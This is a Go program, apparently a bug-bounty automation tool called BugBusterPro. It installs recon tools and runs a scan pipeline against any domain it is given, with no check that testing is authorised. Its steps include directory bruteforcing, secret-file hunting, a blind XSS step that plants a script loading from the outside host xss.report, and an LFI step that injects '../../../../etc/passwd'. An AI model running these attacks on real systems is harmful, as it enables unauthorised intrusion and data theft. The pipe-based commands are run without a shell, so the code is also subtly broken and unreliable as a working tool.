package main

import (
	"bufio"
	"bytes"
	"flag"
	"fmt"
	"io"
	"log"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"sync"
	"time"
)

const (
	colorReset  = "\033[0m"
	colorRed    = "\033[31m"
	colorGreen  = "\033[32m"
	colorYellow = "\033[33m"
	colorBlue   = "\033[34m"
	colorPurple = "\033[35m"
	colorCyan   = "\033[36m"
	colorWhite  = "\033[37m"
)

// Configuration struct for the tool
type Config struct {
	Domain    string
	OutputDir string
	Force     bool
	Threads   int
	LogFile   *os.File
	Logger    *log.Logger
}

// StepInfo struct for step tracking
type StepInfo struct {
	Name        string
	Description string
	Command     string
	OutputFile  string
	Completed   bool
}

// Tools we need to check for
var requiredTools = []string{
	"subfinder",
	"httpx",
	"katana",
	"waybackurls",
	"otxurls",
	"feroxbuster",
	"nuclei",
	"subzy",
	"qsreplace",
	"gf",
	"bxss",
}

func main() {
	// Parse command-line flags
	domain := flag.String("domain", "", "Target domain to scan")
	outputDir := flag.String("output-dir", "output", "Directory to store scan results")
	force := flag.Bool("force", false, "Force rerun of all steps")
	threads := flag.Int("threads", 50, "Number of threads to use")
	flag.Parse()

	if *domain == "" {
		fmt.Println(colorRed + "Error: Domain is required" + colorReset)
		flag.Usage()
		os.Exit(1)
	}

	// Create config
	config := Config{
		Domain:    *domain,
		OutputDir: *outputDir,
		Force:     *force,
		Threads:   *threads,
	}

	// Initialize tool
	initialize(&config)
	defer config.LogFile.Close()

	// Check and install required tools
	checkAndInstallTools(&config)

	// Create necessary directories
	createDirectories(&config)

	// Define all the steps
	steps := defineSteps(&config)

	// Run all steps
	runAllSteps(&config, steps)

	// Print summary
	printSummary(&config, steps)
}

// Initialize the tool, setting up logging etc.
func initialize(config *Config) {
	// Create logs directory
	logsDir := filepath.Join(config.OutputDir, "logs")
	err := os.MkdirAll(logsDir, 0755)
	if err != nil {
		fmt.Printf(colorRed+"Error creating logs directory: %v\n"+colorReset, err)
		os.Exit(1)
	}

	// Create log file
	logFileName := filepath.Join(logsDir, fmt.Sprintf("bugbusterpro_%s_%s.log", config.Domain, time.Now().Format("2006-01-02_15-04-05")))
	logFile, err := os.Create(logFileName)
	if err != nil {
		fmt.Printf(colorRed+"Error creating log file: %v\n"+colorReset, err)
		os.Exit(1)
	}

	// Create multiwriter to write to both console and file
	multiWriter := io.MultiWriter(os.Stdout, logFile)
	logger := log.New(multiWriter, "", log.Ldate|log.Ltime)

	config.LogFile = logFile
	config.Logger = logger

	// Print banner
	printBanner(config)
}

// Print a cool banner
func printBanner(config *Config) {
	banner := `
██████╗ ██╗   ██╗ ██████╗ ██████╗ ██╗   ██╗███████╗████████╗███████╗██████╗ ██████╗ ██████╗  ██████╗ 
██╔══██╗██║   ██║██╔════╝ ██╔══██╗██║   ██║██╔════╝╚══██╔══╝██╔════╝██╔══██╗██╔══██╗██╔══██╗██╔═══██╗
██████╔╝██║   ██║██║  ███╗██████╔╝██║   ██║███████╗   ██║   █████╗  ██████╔╝██████╔╝██████╔╝██║   ██║
██╔══██╗██║   ██║██║   ██║██╔══██╗██║   ██║╚════██║   ██║   ██╔══╝  ██╔══██╗██╔═══╝ ██╔══██╗██║   ██║
██████╔╝╚██████╔╝╚██████╔╝██████╔╝╚██████╔╝███████║   ██║   ███████╗██║  ██║██║     ██║  ██║╚██████╔╝
╚═════╝  ╚═════╝  ╚═════╝ ╚═════╝  ╚═════╝ ╚══════╝   ╚═╝   ╚══════╝╚═╝  ╚═╝╚═╝     ╚═╝  ╚═╝ ╚═════╝ 
                                                                                         v1.0.0                                                                                      
`
	fmt.Println(colorCyan + banner + colorReset)
	config.Logger.Printf("Starting BugBusterPro for domain: %s", config.Domain)
	config.Logger.Printf("Output directory: %s", config.OutputDir)
	config.Logger.Printf("Force rerun: %t", config.Force)
	config.Logger.Printf("Threads: %d", config.Threads)
}

// Check if all required tools are installed
func checkAndInstallTools(config *Config) {
	config.Logger.Println(colorYellow + "Checking required tools..." + colorReset)

	for _, tool := range requiredTools {
		if !isToolInstalled(tool) {
			config.Logger.Printf(colorYellow+"Tool %s not found. Installing..."+colorReset, tool)
			installTool(config, tool)
		} else {
			config.Logger.Printf(colorGreen+"Tool %s found."+colorReset, tool)
		}
	}
}

// Check if a tool is installed
func isToolInstalled(tool string) bool {
	_, err := exec.LookPath(tool)
	return err == nil
}

// Install a missing tool
func installTool(config *Config, tool string) {
	config.Logger.Printf("Installing %s...", tool)

	var cmd *exec.Cmd

	// Different installation methods for different tools
	switch tool {
	case "subfinder":
		cmd = exec.Command("go", "install", "-v", "github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest")
	case "httpx":
		cmd = exec.Command("go", "install", "-v", "github.com/projectdiscovery/httpx/cmd/httpx@latest")
	case "katana":
		cmd = exec.Command("go", "install", "-v", "github.com/projectdiscovery/katana/cmd/katana@latest")
	case "waybackurls":
		cmd = exec.Command("go", "install", "-v", "github.com/tomnomnom/waybackurls@latest")
	case "otxurls":
		cmd = exec.Command("go", "install", "-v", "github.com/lc/otxurls@latest")
	case "feroxbuster":
		// Try apt first, then cargo if available
		if _, err := exec.LookPath("apt"); err == nil {
			cmd = exec.Command("sudo", "apt", "install", "-y", "feroxbuster")
		} else if _, err := exec.LookPath("cargo"); err == nil {
			cmd = exec.Command("cargo", "install", "feroxbuster")
		} else {
			config.Logger.Printf(colorRed+"Cannot install feroxbuster: neither apt nor cargo is available"+colorReset)
			return
		}
	case "nuclei":
		cmd = exec.Command("go", "install", "-v", "github.com/projectdiscovery/nuclei/v2/cmd/nuclei@latest")
	case "subzy":
		cmd = exec.Command("go", "install", "-v", "github.com/LukaSikic/subzy@latest")
	case "qsreplace":
		cmd = exec.Command("go", "install", "-v", "github.com/tomnomnom/qsreplace@latest")
	case "gf":
		cmd = exec.Command("go", "install", "-v", "github.com/tomnomnom/gf@latest")
	case "bxss":
		cmd = exec.Command("go", "install", "-v", "github.com/ethicalhackingplayground/bxss@latest")
	default:
		config.Logger.Printf(colorRed+"Unknown tool: %s"+colorReset, tool)
		return
	}

	// Set HOME environment variable for Go tools
	cmd.Env = append(os.Environ(), fmt.Sprintf("HOME=%s", os.Getenv("HOME")))

	var outb, errb bytes.Buffer
	cmd.Stdout = &outb
	cmd.Stderr = &errb

	err := cmd.Run()
	if err != nil {
		config.Logger.Printf(colorRed+"Failed to install %s: %v\n%s"+colorReset, tool, err, errb.String())
		return
	}

	config.Logger.Printf(colorGreen+"Successfully installed %s"+colorReset, tool)
}

// Create the necessary directories
func createDirectories(config *Config) {
	dirs := []string{
		"subfinder",
		"httpx",
		"urls",
		"js",
		"findings",
		"logs",
	}

	for _, dir := range dirs {
		dirPath := filepath.Join(config.OutputDir, dir)
		err := os.MkdirAll(dirPath, 0755)
		if err != nil {
			config.Logger.Printf(colorRed+"Error creating directory %s: %v"+colorReset, dirPath, err)
		} else {
			config.Logger.Printf(colorGreen+"Created directory: %s"+colorReset, dirPath)
		}
	}
}

// Define all the steps to run
func defineSteps(config *Config) []StepInfo {
	subfinderOutput := filepath.Join(config.OutputDir, "subfinder", "subdomains.txt")
	httpxOutput := filepath.Join(config.OutputDir, "httpx", "alive.txt")
	urlsDir := filepath.Join(config.OutputDir, "urls")
	findingsDir := filepath.Join(config.OutputDir, "findings")
	jsDir := filepath.Join(config.OutputDir, "js")

	steps := []StepInfo{
		{
			Name:        "Subdomain Discovery",
			Description: "Discovering subdomains using subfinder",
			Command:     fmt.Sprintf("subfinder -d %s -o %s -all -recursive", config.Domain, subfinderOutput),
			OutputFile:  subfinderOutput,
		},
		{
			Name:        "Subdomain Probing",
			Description: "Probing discovered subdomains with httpx",
			Command:     fmt.Sprintf("cat %s | httpx -ports 80,443,8000,8008,8888 -threads %d -o %s", subfinderOutput, config.Threads, httpxOutput),
			OutputFile:  httpxOutput,
		},
		{
			Name:        "URL Collection with Katana",
			Description: "Collecting URLs using katana crawler",
			Command:     fmt.Sprintf("katana -list %s -d 5 -jc -ef woff,css,svg,js,png,jpg,woff2,jpeg,gif -o %s", httpxOutput, filepath.Join(urlsDir, "katana.txt")),
			OutputFile:  filepath.Join(urlsDir, "katana.txt"),
		},
		{
			Name:        "URL Collection with Wayback",
			Description: "Collecting URLs from Wayback Machine",
			Command:     fmt.Sprintf("cat %s | waybackurls > %s", httpxOutput, filepath.Join(urlsDir, "wayback.txt")),
			OutputFile:  filepath.Join(urlsDir, "wayback.txt"),
		},
		{
			Name:        "URL Collection with OTX",
			Description: "Collecting URLs from OTX",
			Command:     fmt.Sprintf("cat %s | otxurls > %s", httpxOutput, filepath.Join(urlsDir, "otx.txt")),
			OutputFile:  filepath.Join(urlsDir, "otx.txt"),
		},
		{
			Name:        "Consolidating URLs",
			Description: "Sorting and deduplicating collected URLs",
			Command:     fmt.Sprintf("cat %s/*.txt | sort -u > %s", urlsDir, filepath.Join(urlsDir, "all.txt")),
			OutputFile:  filepath.Join(urlsDir, "all.txt"),
		},
		{
			Name:        "Secret Files Discovery",
			Description: "Finding potential secret files in URLs",
			Command:     fmt.Sprintf("cat %s | grep -E \"\\.txt|\\.log|\\.cache|\\.secret|\\.db|\\.backup|\\.yml|\\.json|\\.gz|\\.rar|\\.zip|\\.config\" > %s", filepath.Join(urlsDir, "all.txt"), filepath.Join(findingsDir, "secrets.txt")),
			OutputFile:  filepath.Join(findingsDir, "secrets.txt"),
		},
		{
			Name:        "JavaScript Files Collection",
			Description: "Collecting JavaScript files from URLs",
			Command:     fmt.Sprintf("cat %s | grep -E \"\\.js$\" > %s", filepath.Join(urlsDir, "all.txt"), filepath.Join(jsDir, "js.txt")),
			OutputFile:  filepath.Join(jsDir, "js.txt"),
		},
		{
			Name:        "JavaScript Files Analysis",
			Description: "Analyzing JavaScript files for vulnerabilities",
			Command:     fmt.Sprintf("cat %s | nuclei -t exposures/ -o %s", filepath.Join(jsDir, "js.txt"), filepath.Join(findingsDir, "js_findings.txt")),
			OutputFile:  filepath.Join(findingsDir, "js_findings.txt"),
		},
		{
			Name:        "Additional JavaScript Analysis",
			Description: "Using katana for JavaScript analysis",
			Command:     fmt.Sprintf("echo %s | katana -ps | grep -E \"\\.js$\" | nuclei -t exposures/ -c 30 -o %s", config.Domain, filepath.Join(findingsDir, "js_katana_findings.txt")),
			OutputFile:  filepath.Join(findingsDir, "js_katana_findings.txt"),
		},
		{
			Name:        "Directory Bruteforce",
			Description: "Bruteforcing directories with feroxbuster",
			Command:     fmt.Sprintf("feroxbuster -u %s -w /usr/share/wordlists/dirb/common.txt -x php,config,log,sql,bak,old,conf,backup,sub,db,asp,aspx,py,rb,cache,cgi,csv,htm,inc,jar,js,json,jsp,lock,rar,swp,txt,wadl,xml,tar.bz2,tar.gz --depth 3 -t 100 -C 404,403 --redirects --user-agent \"Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0\" --auto-tune --scan-limit 10 --collect-backups --collect-extensions -o %s", config.Domain, filepath.Join(urlsDir, "feroxbuster.txt")),
			OutputFile:  filepath.Join(urlsDir, "feroxbuster.txt"),
		},
		{
			Name:        "XSS Scan",
			Description: "Scanning for XSS vulnerabilities",
			Command:     fmt.Sprintf("subfinder -d %s | httpx -silent -ports 80,443,8080,8443 | katana -f qurl -jc | gf xss | bxss -a -p \"<script/src=//xss.report/c/coffinpx></script>\" -t -c 50 > %s", config.Domain, filepath.Join(findingsDir, "xss.txt")),
			OutputFile:  filepath.Join(findingsDir, "xss.txt"),
		},
		{
			Name:        "Subdomain Takeover Check",
			Description: "Checking for subdomain takeover vulnerabilities",
			Command:     fmt.Sprintf("subzy run --targets %s --concurrency 100 --hide_fails --verify_ssl -o %s", subfinderOutput, filepath.Join(findingsDir, "takeovers.txt")),
			OutputFile:  filepath.Join(findingsDir, "takeovers.txt"),
		},
		{
			Name:        "Misconfig/Exposure Scan",
			Description: "Scanning for misconfigurations and exposures",
			Command:     fmt.Sprintf("nuclei -l %s -t misconfig/ -tags cors,misconfig -rate-limit 150 -c 50 -mhe 50 -timeout 15 -severity medium,high,critical -j -stats -irr -o %s", httpxOutput, filepath.Join(findingsDir, "misconfigs.json")),
			OutputFile:  filepath.Join(findingsDir, "misconfigs.json"),
		},
		{
			Name:        "CVEs & Tech Fingerprint",
			Description: "Scanning for CVEs and tech fingerprinting",
			Command:     fmt.Sprintf("nuclei -l %s -tags cve,osint,tech -o %s", httpxOutput, filepath.Join(findingsDir, "nuclei_findings.json")),
			OutputFile:  filepath.Join(findingsDir, "nuclei_findings.json"),
		},
		{
			Name:        "LFI Testing",
			Description: "Testing for Local File Inclusion vulnerabilities",
			Command:     fmt.Sprintf("cat %s | grep -E '\\.php\\?|\\.asp\\?|\\.jsp\\?|file=|page=' | qsreplace \"../../../../etc/passwd\" | nuclei -t vulnerabilities/ -tags lfi,file-inclusion -headless -H \"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36\" -rate-limit 50 -c 30 -timeout 10 -severity medium,high,critical -irr -j -o %s", filepath.Join(urlsDir, "all.txt"), filepath.Join(findingsDir, "lfi.json")),
			OutputFile:  filepath.Join(findingsDir, "lfi.json"),
		},
	}

	return steps
}

// Run all the defined steps
func runAllSteps(config *Config, steps []StepInfo) {
	for i, step := range steps {
		stepNum := i + 1
		config.Logger.Printf(colorCyan+"[%d/%d] %s"+colorReset, stepNum, len(steps), step.Name)
		config.Logger.Printf(colorBlue+"Description: %s"+colorReset, step.Description)

		// Check if this step has already been completed
		if isStepCompleted(step.OutputFile) && !config.Force {
			config.Logger.Printf(colorYellow+"Step already completed. Skipping. Use --force to rerun."+colorReset)
			steps[i].Completed = true
			continue
		}

		// Run the step
		if err := runStep(config, stepNum, step); err != nil {
			config.Logger.Printf(colorRed+"Error running step: %v"+colorReset, err)
			// We continue to the next step even if this one fails
		} else {
			steps[i].Completed = true
			config.Logger.Printf(colorGreen+"Step completed successfully."+colorReset)
		}
	}
}

// Check if a step is already completed
func isStepCompleted(outputFile string) bool {
	info, err := os.Stat(outputFile)
	if err != nil {
		return false
	}
	// Consider a file with zero size as not completed
	return info.Size() > 0
}

// Run a single step
func runStep(config *Config, stepNum int, step StepInfo) error {
	// Create output directory if it doesn't exist
	outputDir := filepath.Dir(step.OutputFile)
	if err := os.MkdirAll(outputDir, 0755); err != nil {
		return fmt.Errorf("error creating output directory: %v", err)
	}

	// Prepare the command
	cmdStr := step.Command

	// Split the command into parts while respecting quotes
	parts, err := parseCommand(cmdStr)
	if err != nil {
		return fmt.Errorf("error parsing command: %v", err)
	}
	
	if len(parts) == 0 {
		return fmt.Errorf("empty command")
	}

	cmd := exec.Command(parts[0], parts[1:]...)

	// Set up pipes for command output
	stdout, err := cmd.StdoutPipe()
	if err != nil {
		return fmt.Errorf("error creating stdout pipe: %v", err)
	}
	stderr, err := cmd.StderrPipe()
	if err != nil {
		return fmt.Errorf("error creating stderr pipe: %v", err)
	}

	// Start the command
	config.Logger.Printf("Running command: %s", cmdStr)
	if err := cmd.Start(); err != nil {
		return fmt.Errorf("error starting command: %v", err)
	}

	// Create a file to capture output
	outputFile, err := os.Create(step.OutputFile)
	if err != nil {
		return fmt.Errorf("error creating output file: %v", err)
	}
	defer outputFile.Close()

	// Create a WaitGroup to wait for both stdout and stderr to be processed
	var wg sync.WaitGroup
	wg.Add(2)

	// Process stdout
	go func() {
		defer wg.Done()
		scanner := bufio.NewScanner(stdout)
		for scanner.Scan() {
			line := scanner.Text()
			config.Logger.Printf(colorWhite+"[stdout] %s"+colorReset, line)
			fmt.Fprintln(outputFile, line)
		}
		if err := scanner.Err(); err != nil {
			config.Logger.Printf(colorRed+"Error reading stdout: %v"+colorReset, err)
		}
	}()

	// Process stderr
	go func() {
		defer wg.Done()
		scanner := bufio.NewScanner(stderr)
		for scanner.Scan() {
			line := scanner.Text()
			config.Logger.Printf(colorYellow+"[stderr] %s"+colorReset, line)
		}
		if err := scanner.Err(); err != nil {
			config.Logger.Printf(colorRed+"Error reading stderr: %v"+colorReset, err)
		}
	}()

	// Wait for the command to finish
	err = cmd.Wait()
	
	// Wait for both stdout and stderr to be processed
	wg.Wait()

	if err != nil {
		// Check if the file is empty
		info, statErr := os.Stat(step.OutputFile)
		if statErr == nil && info.Size() == 0 {
			// If the output file is empty and command failed, write error to file
			fmt.Fprintf(outputFile, "Command failed with error: %v\n", err)
		}
		return fmt.Errorf("command exited with error: %v", err)
	}

	return nil
}

// parseCommand splits a command string into parts while respecting quotes
func parseCommand(cmd string) ([]string, error) {
	var parts []string
	var current strings.Builder
	inQuotes := false
	escapeNext := false

	for _, r := range cmd {
		if escapeNext {
			current.WriteRune(r)
			escapeNext = false
			continue
		}

		if r == '\\' {
			escapeNext = true
			continue
		}

		if r == '"' {
			inQuotes = !inQuotes
			continue
		}

		if r == ' ' && !inQuotes {
			if current.Len() > 0 {
				parts = append(parts, current.String())
				current.Reset()
			}
			continue
		}

		current.WriteRune(r)
	}

	if current.Len() > 0 {
		parts = append(parts, current.String())
	}

	if inQuotes {
		return nil, fmt.Errorf("unclosed quotes in command")
	}

	return parts, nil
}

// Print a summary of the scan
func printSummary(config *Config, steps []StepInfo) {
	config.Logger.Println(colorPurple + "\n===== BugBusterPro Scan Summary =====" + colorReset)
	config.Logger.Printf("Domain: %s", config.Domain)
	config.Logger.Printf("Output Directory: %s", config.OutputDir)

	// Count completed steps
	completedSteps := 0
	for _, step := range steps {
		if step.Completed {
			completedSteps++
		}
	}

	config.Logger.Printf("Steps Completed: %d/%d", completedSteps, len(steps))

	if completedSteps == len(steps) {
		config.Logger.Println(colorGreen + "All steps completed successfully!" + colorReset)
	} else {
		config.Logger.Println(colorYellow + "Some steps did not complete. Check the logs for details." + colorReset)
	}

	// List output files
	config.Logger.Println(colorCyan + "\nOutput Files:" + colorReset)
	for _, step := range steps {
		if step.Completed {
			fileInfo, err := os.Stat(step.OutputFile)
			if err == nil {
				config.Logger.Printf("- %s (%.2f KB)", step.OutputFile, float64(fileInfo.Size())/1024)
			} else {
				config.Logger.Printf("- %s (not found)", step.OutputFile)
			}
		}
	}

	config.Logger.Println(colorPurple + "\nScan completed at: " + time.Now().Format("2006-01-02 15:04:05") + colorReset)
}
